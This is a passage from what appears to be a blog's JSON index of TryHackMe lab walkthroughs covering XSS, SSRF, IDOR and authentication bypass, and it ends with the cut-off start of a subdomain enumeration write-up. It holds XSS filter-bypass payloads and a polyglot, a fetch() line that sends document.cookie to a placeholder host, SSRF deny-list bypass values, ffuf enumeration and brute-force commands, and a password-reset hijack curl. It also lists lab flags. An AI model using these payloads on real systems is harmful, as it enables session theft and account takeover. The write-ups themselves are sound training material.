code.\n\nYou’ll have to escape the existing JavaScript command, so you’re able to run your code; you can do this with the following payload ‘;alert(‘THM’);&#x2F;&#x2F;  which you’ll see from the below screenshot will execute your code. The ‘ closes the field specifying the name, then ; signifies the end of the current command, and the &#x2F;&#x2F; at the end makes anything after it a comment rather than executable code.\n\nNow when you click the enter button, you’ll get an alert popup with the string THM. And then, you’ll get a confirmation message that your payload was successful with a link to the next level.\nLevel Five:\nNow, this level looks the same as level one, and your name also gets reflected in the same place. But if you try the &lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt; payload, it won’t work. When you view the page source, you’ll see why.\n\nThe word script  gets removed from your payload, that’s because there is a filter that strips out any potentially dangerous words.\nWhen a word gets removed from a string, there’s a helpful trick that you can try.\nOriginal Payload:\n&lt;sscriptcript&gt;alert(&#39;THM&#39;);&lt;/sscriptcript&gt;\nText to be removed (by the filter):\n&lt;sscriptcript&gt;alert(&#39;THM&#39;);&lt;/sscriptcript&gt;\nFinal Payload (after passing the filter):\n&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;\nTry entering the payload &lt;sscriptcript&gt;alert(&#39;THM&#39;);&lt;/sscriptcript&gt; and click the enter button, you’ll get an alert popup with the string THM. And then, you’ll get a confirmation message that your payload was successful with a link to the next level.\nLevel Six:\nSimilar to level two, where we had to escape from the value attribute of an input tag, we can try &quot;&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt; , but that doesn’t seem to work. Let’s inspect the page source to see why that doesn’t work.\n\nYou can see that the &lt; and &gt; characters get filtered out from our payload, preventing us from escaping the IMG tag. To get around the filter, we can take advantage of the additional attributes of the IMG tag, such as the onload event. The onload event executes the code of your choosing once the image specified in the src attribute has loaded onto the web page.\nLet’s change our payload to reflect this /images/cat.jpg&quot; onload=&quot;alert(&#39;THM&#39;); and then viewing the page source, and you’ll see how this will work.\n\nNow when you click the enter button, you’ll get an alert popup with the string THM. And then, you’ll get a confirmation message that your payload was successful; with this being the last level, you’ll receive a flag that can be entered below.\nPolyglots:\nAn XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you’ve just completed, and it would have executed the code successfully.\n1jaVasCript:/*-/*`/*\\`/*&#x27;/*&quot;/**/(/* */onerror=alert(&#x27;THM&#x27;) )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\x3csVg/&lt;sVg/oNloAd=alert(&#x27;THM&#x27;)//&gt;\\x3e\n\nAnswer the questions below1. What is the flag you received from level six?\nCreate an account on the ACME IT SUPPORT Page and follow the steps given in the task \nAnswer: THM&#123;XSS_MASTER&#125;\nTASK 8 - Practical Example (Blind XSS)For the last task, we will go over a Blind XSS vulnerability. Ensure you terminate the previous machine and then click on the green Start Machine button on the right to load the Acme IT Support website. You’ll need to use the AttackBox using the blue button at the top of the page. Once loaded, open the link below inside the AttackBox’s Firefox browser to view the target website.\nhttps://LAB_WEB_URL.p.thmlabs.com\nClick on the Customers tab on the top navigation bar and click the “Signup here” link to create an account. Once your account gets set up, click the Support Tickets tab, which is the feature we will investigate for weaknesses. \nTry creating a support ticket by clicking the green Create Ticket button, enter the subject and content of just the word test and then click the blue Create Ticket button. You’ll now notice your new ticket in the list with an id number which you can click to take you to your newly created ticket. \nLike task three, we will investigate how the previously entered text gets reflected on the page. Upon viewing the page source, we can see the text gets placed inside a textarea tag.\n\nLet’s now go back and create another ticket. Let’s see if we can escape the textarea tag by entering the following payload into the ticket contents:\n&lt;/textarea&gt;test\nAgain, opening the ticket and viewing the page source, we’ve successfully escaped the textarea tag.\n\nLet’s now expand on this payload to see if we can run JavaScript and confirm that the ticket creation feature is vulnerable to an XSS attack. Try another new ticket with the following payload:\n&lt;/textarea&gt;&lt;script&gt;alert(&#39;THM&#39;);&lt;/script&gt;\nNow when you view the ticket, you should get an alert box with the string THM. We’re going to now expand the payload even further and increase the vulnerabilities impact. Because this feature is creating a support ticket, we can be reasonably confident that a staff member will also view this ticket which we could get to execute JavaScript. \nSome helpful information to extract from another user would be their cookies, which we could use to elevate our privileges by hijacking their login session. To do this, our payload will need to extract the user’s cookie and exfiltrate it to another webserver server of our choice. Firstly, we’ll need to set up a listening server to receive the information.\nUsing the AttackBox, let’s set up a listening server using Netcat. If we want to listen on port 9001, we issue the command nc -l -p 9001. The -l option indicates that we want to use Netcat in listen mode, while the -p option is used to specify the port number. To avoid the resolution of hostnames via DNS, we can add -n; moreover, to discover any errors, running Netcat in verbose mode by adding the -v option is recommended. The final command becomes nc -n -l -v -p 9001, equivalent to nc -nlvp 9001.\nnc\n12user@machine$ nc -nlvp 9001Listening on [0.0.0.0] (family 0, port 9001)\nNow that we’ve set up the method of receiving the exfiltrated information, let’s build the payload.\n&lt;/textarea&gt;&lt;script&gt;fetch(&#39;http://URL_OR_IP:PORT_NUMBER?cookie=&#39; + btoa(document.cookie) );&lt;/script&gt;\nLet’s break down the payload:\nThe &lt;/textarea&gt; tag closes the text area field.The &lt;script&gt; tag opens an area for us to write JavaScript.The fetch() command makes an HTTP request.URL_OR_IP is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.PORT_NUMBER is the port number you are using to listen for connections on the AttackBox.?cookie= is the query string containing the victim’s cookies.btoa() command base64 encodes the victim’s cookies.document.cookie accesses the victim’s cookies for the Acme IT Support Website.&lt;/script&gt; closes the JavaScript code block.Now create another ticket using the above payload, making sure to swap out the URL_OR_IP:PORT_NUMBER variables with your settings (make sure to specify the port number as well for the Netcat listener). Now, wait up to a minute, and you will see the request come through containing the victim’s cookies.\nNote: You may encounter issues with receiving the request using your own VM and the VPN. It is recommended you use the AttackBox for this task.\nYou can now base64 decode this information using a site like https://www.base64decode.org/, giving you the necessary information to answer the below question.\nAnswer the questions below1. What is the value of the staff-session cookie?\n\nDecode the encoded cookie value and get the flag \nAnswer: 4AB305E55955197693F01D6F8FD2D321\nThank You 💌Author: Satvik Shetty🧑‍💻See you again in another writeup\n","slug":"THM/WEB/Intro-to-Cross-Site-Scripting","date":"2024-06-08T16:41:38.000Z","categories_index":"cybersecurity,THM,web","tags_index":"tryhackme,web","author_index":"Satvik"},{"id":"6937fd4b35dfe494a27e1637f94b0a2f","title":"SSRF Walkthrough - THM","content":"Hello Hackers 💌Today we are gonna walkthrough a new room in Web Fundamentals called SSRF on #TryHackMeLets start 🚀\n\n  \n    View notes 👀\n  \n\n\n\nTASK 1 - What is an SSRF ?Room Brief\nIn this room, you’ll learn what an SSRF is, what kind of impact they can have, you’ll view some example SSRF attacks, how you can discover SSRF vulnerabilities, how to circumvent input rules and then we have a practice for you against with to try your newfound skills.\nWhat is an SSRF?\nSSRF stands for Server-Side Request Forgery. It’s a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker’s choosing.\nTypes of SSRF\nThere are two types of SSRF vulnerability; the first is a regular SSRF where data is returned to the attacker’s screen. The second is a Blind SSRF vulnerability where an SSRF occurs, but no information is returned to the attacker’s screen.\nWhat’s the impact?A successful SSRF attack can result in any of the following: \nAccess to unauthorised areas.Access to customer&#x2F;organisational data.Ability to Scale to internal networks.Reveal authentication tokens&#x2F;credentials.\nAnswer the questions below1. What does SSRF stand for?Answer: Server-Side Request Forgery\n2. As opposed to a regular SSRF, what is the other type?Answer: Blind\n\nSSRF ExamplesClick the View Site button, which will take you through some common SSRF examples, how to exploit them and even a simulation to see if you can take advantage of an SSRF vulnerability using what you’ve learnt.\nAnswer the questions below1. What is the flag from the SSRF Examples site?\n\nIn the address bar in the excercise you need to put this : https://website.thm/item/2?server=server.website.thm/flag?id=9&amp;x\n\nAnswer: THM&#123;SSRF_MASTER&#125;\n\n\n\nFinding an SSRFPotential SSRF vulnerabilities can be spotted in web applications in many different ways. Here is an example of four common places to look:\nWhen a full URL is used in a parameter in the address bar:\n\nA hidden field in a form:\n\nA partial URL such as just the hostname:\n\nOr perhaps only the path of the URL:\n\nSome of these examples are easier to exploit than others, and this is where a lot of trial and error will be required to find a working payload.\nIf working with a blind SSRF where no output is reflected back to you, you’ll need to use an external HTTP logging tool to monitor requests such as requestbin.com, your own HTTP server or Burp Suite’s Collaborator client.\nAnswer the questions below1. What website can be used to catch HTTP requests from a server?Answer: requestbin.com\n\nTASK 4 - Defeating Common SSRF DefensesMore security-savvy developers aware of the risks of SSRF vulnerabilities may implement checks in their applications to make sure the requested resource meets specific rules. There are usually two approaches to this, either a deny list or an allow list.\nDeny List\nA Deny List is where all requests are accepted apart from resources specified in a list or matching a particular pattern. A Web Application may employ a deny list to protect sensitive endpoints, IP addresses or domains from being accessed by the public while still allowing access to other locations. A specific endpoint to restrict access is the localhost, which may contain server performance data or further sensitive information, so domain names such as localhost and 127.0.0.1 would appear on a deny list. Attackers can bypass a Deny List by using alternative localhost references such as 0, 0.0.0.0, 0000, 127.1, 127...*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io.\nAlso, in a cloud environment, it would be beneficial to block access to the IP address 169.254.169.254, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254.\nAllow List\nAn allow list is where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL used in a parameter must begin with https://website.thm. An attacker could quickly circumvent this rule by creating a subdomain on an attacker’s domain name, such as https://website.thm.attackers-domain.thm. The application logic would now allow this input and let an attacker control the internal HTTP request.\nOpen Redirect\nIf the above bypasses do not work, there is one more trick up the attacker’s sleeve, the open redirect. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address. Take, for example, the link https://website.thm/link?url=https://tryhackme.com. This endpoint was created to record the number of times visitors have clicked on this link for advertising&#x2F;marketing purposes. But imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.thm/. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker’s choice.\nAnswer the questions below1. What method can be used to bypass strict rules?Answer: Open Redirect\n2. What IP address may contain sensitive data in a cloud environment?\nAnswer: 169.254.169.254\n3. What type of list is used to permit only certain input?\nAnswer: Allow List\n4. What type of list is used to stop certain input?\nAnswer: Deny List\n\nTASK 5 - SSRF PracticalLet’s put what we’ve learnt about SSRF to the test in a fictional scenario.\nWe’ve come across two new endpoints during a content discovery exercise against the Acme IT Support website. The first one is &#x2F;private, which gives us an error message explaining that the contents cannot be viewed from our IP address. The second is a new version of the customer account page at &#x2F;customers&#x2F;new-account-page with a new feature allowing customers to choose an avatar for their account.\nBegin by clicking the Start Machine button to launch the Acme IT Support website. Once running, visit it at the URL https://LAB_WEB_URL.p.thmlabs.com and then follow the below instructions to get the flag.\nFirst, create a customer account and sign in. Once you’ve signed in, visit https://LAB_WEB_URL.p.thmlabs.com/customers/new-account-page to view the new avatar selection feature. By viewing the page source of the avatar form, you’ll see the avatar form field value contains the path to the image. The background-image style can confirm this in the above DIV element as per the screenshot below:\n\nIf you choose one of the avatars and then click the Update Avatar button, you’ll see the form change and, above it, display your currently selected avatar.\n\nViewing the page source will show your current avatar is displayed using the data URI scheme, and the image content is base64 encoded as per the screenshot below.\n\nNow let’s try making the request again but changing the avatar value to private in hopes that the server will access the resource and get past the IP address block. To do this, firstly, right-click on one of the radio buttons on the avatar form and select Inspect:\n\nAnd then edit the value of the radio button to private:\nhttps://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/a1712298679cc642d792d935b14effe5.png\nBe sure to select the avatar you edited and then click the Update Avatar button. Unfortunately, it looks like the web application has a deny list in place and has blocked access to the &#x2F;private endpoint.\n\nAs you can see from the error message, the path cannot start with &#x2F;private but don’t worry, we’ve still got a trick up our sleeve to bypass this rule. We can use a directory traversal trick to reach our desired endpoint. Try setting the avatar value to x&#x2F;..&#x2F;private\n\nYou’ll see we have now bypassed the rule, and the user updated the avatar. This trick works because when the web server receives the request for x&#x2F;..&#x2F;private, it knows that the ..&#x2F; string means to move up a directory that now translates the request to just &#x2F;private.\nViewing the page source of the avatar form, you’ll see the currently set avatar now contains the contents from the &#x2F;private directory in base64 encoding, decode this content and it will reveal a flag that you can enter below.\nAnswer the questions below1. What is the flag from the &#x2F;private directory?\nAnswer: \n\nFollow the steps in the task carefully\nNow you will find the hash in the source code if you did all the things correctly\nNow decode the hash using the Cyberchef tool or anyother tool you know\n\n\n\nFlag : THM&#123;YOU_WORKED_OUT_THE_SSRF&#125;\n\nThank You 💌Author: Satvik Shetty🧑‍💻See you again in another writeup\n","slug":"THM/WEB/SSRF-Walkthrough-THM","date":"2024-06-07T13:14:36.000Z","categories_index":"cybersecurity,THM,web","tags_index":"tryhackme,web","author_index":"Satvik"},{"id":"3e8a6fee12ff22738278818798983478","title":"IDOR - THM Walkthrough","content":"Hello Hackers 💌Today we are gonna walkthrough a new room in Web Fundamentals called IDOR on #TryHackMeLets start 🚀\n\n  \n    View notes 👀\n  \n\n\nTASK 1 - What is an IDORIn this room, you’re going to learn what an IDOR vulnerability is, what they look like, how to find them and a practical task exploiting a real case scenario.\nWhat is an IDOR?\nIDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.\nThis type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it.\nQuestions and answers in the task1. What does IDOR stand for?Answer: Insecure Direct Object Reference\nTASK 2 - An IDOR ExampleImagine you’ve just signed up for an online service, and you want to change your profile information. The link you click on goes to http://online-service.thm/profile?user_id=1305, and you can see your information.\nCuriosity gets the better of you, and you try changing the user_id value to 1000 instead (http://online-service.thm/profile?user_id=1000), and to your surprise, you can now see another user’s information. You’ve now discovered an IDOR vulnerability! Ideally, there should be a check on the website to confirm that the user information belongs to the user logged requesting it.\nUsing what you’ve learnt above, click on the View Site button and try and receive a flag by discovering and exploiting an IDOR vulnerability\nClick on View Site\nQuestions and Answers in the task1. What is the Flag from the IDOR example website?Answer: \n\nclick on view site button\ngo through the mails and analyze the link structure\n\n\n\nThe link in the second mail could be an IDOR , because it’s having order ID in the URL . Lets dive into it\nclick on the link and try to change the ORDER ID to 1000 from 1234\n\n\n\nHurray ! We have succesfully exploited an IDOR Vulnerability in the site\nFlag : THM&#123;IDOR-VULN-FOUND&#125;\n\nTASK 3 - Finding IDORs in Encoded IDsEncoded IDsWhen passing data from page to page either by post data, query strings, or cookies, web developers will often first take the raw data and encode it. Encoding ensures that the receiving web server will be able to understand the contents. Encoding changes binary data into an ASCII string commonly using the a-z, A-Z, 0-9 and = character for padding. The most common encoding technique on the web is base64 encoding and can usually be pretty easy to spot. You can use websites like https://www.base64decode.org/ to decode the string, then edit the data and re-encode it again using https://www.base64encode.org/ and then resubmit the web request to see if there is a change in the response.\nSee the image below as a graphical example of this process:\n\nQuestins and Answers in the Task1. What is a common type of encoding used by websites?Answer: base64\nTASK 4 - Finding IDORs in Hashed IDsHashed IDs\nHashed IDs are a little bit more complicated to deal with than encoded ones, but they may follow a predictable pattern, such as being the hashed version of the integer value. For example, the Id number 123 would become 202cb962ac59075b964b07152d234b70 if md5 hashing were in use.\nIt’s worthwhile putting any discovered hashes through a web service such as https://crackstation.net/ (which has a database of billions of hash to value results) to see if we can find any matches.\nQuestions and Answers in te Task1. What is a common algorithm used for hashing IDs?Answer: MD5\nTASK 5 - Finding IDORs in Unpredictable IDsUnpredictable IDs\nIf the Id cannot be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the Id numbers between them. If you can view the other users’ content using their Id number while still being logged in with a different account (or not logged in at all), you’ve found a valid IDOR vulnerability.\nAnswer the questions below1. What is the minimum number of accounts you need to create to check for IDORs between accounts?Answer: 2\nTASK 6 - Where are IDORs locatedWhere are they located?\nThe vulnerable endpoint you’re targeting may not always be something you see in the address bar. It could be content your browser loads in via an AJAX request or something that you find referenced in a JavaScript file. \nSometimes endpoints could have an unreferenced parameter that may have been of some use during development and got pushed to production. For example, you may notice a call to /user/details displaying your user information (authenticated through your session). But through an attack known as parameter mining, you discover a parameter called user_id that you can use to display other users’ information, for example, /user/details?user_id=123.\nTASK 7 - A Practical IDOR ExampleBegin by pressing the Start Machine button; once started, click the below link and open it in a new browser tab:\nhttps://10-10-23-47.p.thmlabs.com\nFirstly you’ll need to log in. To do this, click on the customer’s section and create an account. Once logged in, click on the Your Account tab. \nThe Your Account section gives you the ability to change your information such as username, email address and password. You’ll notice the username and email fields pre-filled in with your information.  \nWe’ll start by investigating how this information gets pre-filled. If you open your browser developer tools, select the network tab and then refresh the page, you’ll see a call to an endpoint with the path /api/v1/customer?id=&#123;user_id&#125;.\nThis page returns in JSON format your user id, username and email address. We can see from the path that the user information shown is taken from the query string’s id parameter (see below image).\n\nYou can try testing this id parameter for an IDOR vulnerability by changing the id to another user’s id. Try selecting users with IDs 1 and 3 and then answer the questions below.\nQuestions and ANswers in the Task1. What is the username for user id 1?Answer:\n\nTo know the user name of used id 1 , we need to go to network tab in developer tools \nselect the USER ID Field and open it in new tab\n\n\n\nNow change the user id to 1 in the link opened in new tab\n\n\n\nWe can see the details of with USER ID : 1 \nName : adam84\n\n2. What is the email address for user id 3?\nAnswer:\n\nJust change the user ID to 3 in the URL\n\n\n\nEmail : j@fakemail.thm\n\nThank You 💌Author: Satvik Shetty🧑‍💻See you again in another writeup\n","slug":"THM/WEB/IDOR-THM-Walkthrough","date":"2024-06-04T09:53:27.000Z","categories_index":"cybersecurity,THM,web","tags_index":"tryhackme,web","author_index":"Satvik"},{"id":"b98fdad01f5200d25c912ff8eb29e414","title":"Authentication Bypass - THM Walkthrough","content":"Hello Hackers 💌Today we are going to walkthrough a new room called Authentication Bypass on TryHackMewhich is a part of Web FundamentalsLets start 🚀 \n\n  \n    View Notes 👀\n  \n\n\n\nTASK 1 - BriefIn this room, we will learn about different ways website authentication methods can be bypassed, defeated or broken. These vulnerabilities can be some of the most critical as it often ends in leaks of customers personal data.\nStart the machine and then proceed to the next task.\nStart your machine Guys\nTASK 2 - Username enumerationA helpful exercise to complete when trying to find authentication vulnerabilities is creating a list of valid usernames, which we’ll use later in other tasks.\nWebsite error messages are great resources for collating this information to build our list of valid usernames. We have a form to create a new user account if we go to the Acme IT Support website (http://10.10.252.140/customers/signup) signup page.\nIf you try entering the username admin and fill in the other form fields with fake information, you’ll see we get the error An account with this username already exists. We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches.\nUsername enumeration with ffuf\n1user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d &quot;username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u http://10.10.252.140/customers/signup -mr &quot;username already exists&quot;\nIn the above example, the -w argument selects the file’s location on the computer that contains the list of usernames that we’re going to check exists. The -X argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. The -d argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We’ve set the value of the username to FUZZ. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The -H argument is used for adding additional headers to the request. In this instance, we’re setting the Content-Type so the web server knows we are sending form data. The -u argument specifies the URL we are making the request to, and finally, the -mr argument is the text on the page we are looking for to validate we’ve found a valid username.\nThe ffuf tool and wordlist come pre-installed on the AttackBox or can be installed locally by downloading it from https://github.com/ffuf/ffuf.\nCreate a file called valid_usernames.txt and add the usernames that you found using ffuf; these will be used in Task 3.\nAnswer the questions belowFirst we need to enumerate the usernames :command:ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d &quot;username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u http://10.10.252.140/customers/signup -mr &quot;username already exists&quot;\n\n1. What is the username starting with si____?Answer: simon\n2. What is the username starting with st____?Answer: steve\n3. What is the username starting with ro____?Answer: robert\nTASK 3 - BruteForceUsing the valid_usernames.txt file we generated in the previous task, we can now use this to attempt a brute force attack on the login page (http://10.10.252.140/customers/login).\nNote: If you created your valid_usernames file by piping the output from ffuf directly you may have difficulty with this task. Clean your data, or copy just the names into a new file.\nA brute force attack is an automated process that tries a list of commonly used passwords against either a single username or, like in our case, a list of usernames.\nWhen running this command, make sure the terminal is in the same directory as the valid_usernames.txt file.\nBruteforcing with ffufuser@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d &quot;username=W1&amp;password=W2&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u http://10.10.252.140/customers/login -fc 200\nThis ffuf command is a little different to the previous one in Task 2. Previously we used the FUZZ keyword to select where in the request the data from the wordlists would be inserted, but because we’re using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we’ve chosen W1 for our list of valid usernames and W2 for the list of passwords we will try. The multiple wordlists are again specified with the -w argument but separated with a comma.  For a positive match, we’re using the -fc argument to check for an HTTP status code other than 200.\nRunning the above command will find a single working username and password combination that answers the question below.\nAnswer the questions below1. What is the valid username and password (format: username&#x2F;password)?\n\nWe can bruteforce the password on the usernames we have enumerated in Task 2\n\n\nAnswer: steve/thunder\nTASK 4 -  Logic FlawWhat is a Logic Flaw?\nSometimes authentication processes contain logic flaws. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website, but we’re going to concentrate on examples relating to authentication in this instance.\n\nLogic Flaw Example\nThe below mock code example checks to see whether the start of the path the client is visiting begins with &#x2F;admin and if so, then further checks are made to see whether the client is, in fact, an admin. If the page doesn’t begin with &#x2F;admin, the page is shown to the client.\n12345if( url.substr(0,6) === &#x27;/admin&#x27;) &#123;    # Code to check user is an admin&#125; else &#123;    # View Page&#125;\n\nBecause the above PHP code example uses three equals signs (&#x3D;&#x3D;&#x3D;), it’s looking for an exact match on the string, including the same letter casing. The code presents a logic flaw because an unauthenticated user requesting &#x2F;adMin will not have their privileges checked and have the page displayed to them, totally bypassing the authentication checks.\nLogic Flaw Practical\nWe’re going to examine the Reset Password function of the Acme IT Support website (http://10.10.252.140/customers/reset). We see a form asking for the email address associated with the account on which we wish to perform the password reset. If an invalid email is entered, you’ll receive the error message “Account not found from supplied email address”.\nFor demonstration purposes, we’ll use the email address &#114;&#x6f;&#98;&#101;&#x72;&#x74;&#x40;&#x61;&#99;&#x6d;&#101;&#105;&#x74;&#115;&#117;&#x70;&#x70;&#x6f;&#114;&#x74;&#46;&#x74;&#104;&#109; which is accepted. We’re then presented with the next stage of the form, which asks for the username associated with this login email address. If we enter robert as the username and press the Check Username button, you’ll be presented with a confirmation message that a password reset email will be sent to &#x72;&#x6f;&#x62;&#101;&#114;&#116;&#64;&#97;&#99;&#x6d;&#101;&#x69;&#x74;&#115;&#x75;&#112;&#x70;&#111;&#114;&#x74;&#x2e;&#116;&#104;&#109;.\n\nAt this stage, you may be wondering what the vulnerability could be in this application as you have to know both the email and username and then the password link is sent to the email address of the account owner.\nThis walkthrough will require running both of the below Curl Requests on the AttackBox which can be opened by using the Blue Button Above.\nIn the second step of the reset email process, the username is submitted in a POST field to the web server, and the email address is sent in the query string request as a GET field.\nLet’s illustrate this by using the curl tool to manually make the request to the webserver.\nCurl Request 1:\n1user@tryhackme$ curl &#x27;http://10.10.252.140/customers/reset?email=robert%40acmeitsupport.thm&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -d &#x27;username=robert&#x27;\nWe use the -H flag to add an additional header to the request. In this instance, we are setting the Content-Type to application/x-www-form-urlencoded, which lets the web server know we are sending form data so it properly understands our request.In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable $_REQUEST.\nThe PHP $_REQUEST variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.\nCurl Request 2:\n1user@tryhackme$ curl &#x27;http://10.10.252.140/customers/reset?email=robert%40acmeitsupport.thm&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -d &#x27;username=robert&amp;email=attacker@hacker.com&#x27;\n\n\nFor the next step, you’ll need to create an account on the Acme IT support customer section, doing so gives you a unique email address that can be used to create support tickets. The email address is in the format of {username}@customer.acmeitsupport.thm\nNow rerunning Curl Request 2 but with your @acmeitsupport.thm in the email field you’ll have a ticket created on your account which contains a link to log you in as Robert. Using Robert’s account, you can view their support tickets and reveal a flag.\nCurl Request 2 (but using your @acmeitsupport.thm account):\n1user@tryhackme:~$ curl &#x27;http://10.10.252.140/customers/reset?email=robert@acmeitsupport.thm&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -d &#x27;username=robert&amp;email=&#123;username&#125;@customer.acmeitsupport.thm&#x27;\n\nAnswers the Questions Below1. What is the flag from Robert’s support ticket?\n\nfirst create an account on the site\n\ngo to the support ticket section and grab your mail ID\n\nthe enter the command to bypass email verification link to your mail ID using the following commandCommand:curl &#39;http://10.10.252.140/customers/reset?email=robert@acmeitsupport.thm&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -d &#39;username=robert&amp;email=&#123;username&#125;@customer.acmeitsupport.thm&#39;Make sure you replace your mail id\n\ncommand: &#96;curl ‘http://10.10.252.140/customers/reset?email=robert@acmeitsupport.thm‘ -H ‘Content-Type: application&#x2F;x-www-form-urlencoded’ -d ‘username&#x3D;robert&amp;email&#x3D;{username}@customer.acmeitsupport.thm’\n\nnow after this , go to support ticket section again\n\nyou will now see one ticket has been raised there !\n\nview it \n\ngo to the link that they provided in the ticket\n\nDone! You have sucessfully bypassed the password reset mail\n\nnow you have been logged in as Robert \n\ngo support tickets to find the flag\n\nFlag: THM&#123;AUTH_BYPASS_COMPLETE&#125;\n\n\nTASK 5 - Cookie TamperingExamining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user’s account, or elevated privileges. If you need a refresher on cookies, check out the HTTP In Detail room on task 6.\nPlain Text\nThe contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login:\n12Set-Cookie: logged_in=true; Max-Age=3600; Path=/Set-Cookie: admin=false; Max-Age=3600; Path=/\nWe see one cookie (logged_in), which appears to control whether the user is currently logged in or not, and another (admin), which controls whether the visitor has admin privileges. Using this logic, if we were to change the contents of the cookies and make a request we’ll be able to change our privileges.\nFirst, we’ll start just by requesting the target page:\nCurl Request 1*\n1user@tryhackme$ curl http://10.10.252.140/cookie-test\nWe can see we are returned a message of: Not Logged In\nNow we’ll send another request with the logged_in cookie set to true and the admin cookie set to false:\nCurl Request 2\n1user@tryhackme$ curl -H &quot;Cookie: logged_in=true; admin=false&quot; http://10.10.252.140/cookie-test\nWe are given the message: Logged In As A User\nFinally, we’ll send one last request setting both the logged_in and admin cookie to true:\nCurl Request 3\n1user@tryhackme$ curl -H &quot;Cookie: logged_in=true; admin=true&quot; http://10.10.252.140/cookie-test\nThis returns the result: Logged In As An Admin as well as a flag which you can use to answer question one.\nHashing\nSometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text. Here are some examples that you may come across:\n\n\n\nOriginal String\nHash Method\nOutput\n\n\n\n1\nmd5\nc4ca4238a0b923820dcc509a6f75849b\n\n\n1\nsha-256\n6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b\n\n\n1\nsha-512\n4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a\n\n\n1\nsha1\n356a192b7913b04c54574d18c28d46e6395428ab\n\n\nYou can see from the above table that the hash output from the same input string can significantly differ depending on the hash method in use. Even though the hash is irreversible, the same output is produced every time, which is helpful for us as services such as https://crackstation.net/ keep databases of billions of hashes and their original strings.\nEncoding\nEncoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point in encoding? Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.\nCommon encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, &#x2F; and the equals sign for padding.\nTake the below data as an example which is set by the web server upon logging in:\nSet-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/\nThis string base64 decoded has the value of &#123;&quot;id&quot;:1,&quot;admin&quot;: false&#125; we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access.\nAnswer the questions below1. What is the flag from changing the plain text cookie values?Answer: THM&#123;COOKIE_TAMPERING&#125;\n2. What is the value of the md5 hash 3b2a1053e3270077456a79192070aa78 ?Answer: 463729\n3. What is the base64 decoded value of VEhNe0JBU0U2NF9FTkNPRElOR30&#x3D; ?Answer: THM&#123;BASE64_ENCODING&#125;\n4. Encode the following value using base64 {“id”:1,”admin”:true}Answer: eyJpZCI6MSwiYWRtaW4iOnRydWV9\nThank You 💌Author: Satvik Shetty🧑‍💻See you again in another writeup\n","slug":"THM/WEB/Authentication-Bypass-THM-Walkthrough","date":"2024-06-03T10:20:32.000Z","categories_index":"cybersecurity,THM,web","tags_index":"tryhackme,web","author_index":"Satvik"},{"id":"5a327520fa9108575adc8c8430f6b8a0","title":"Sub Domain Enumeration - THM Walkthrough","content":"Hello Hackers 💌Today we are going to walkthrough a new room called “ Sub Domain Eneumeration” on TryHackMeLets start 🚀\nTASK 1 - BriefSubdomain enumeration is the process of finding valid subdomains for a 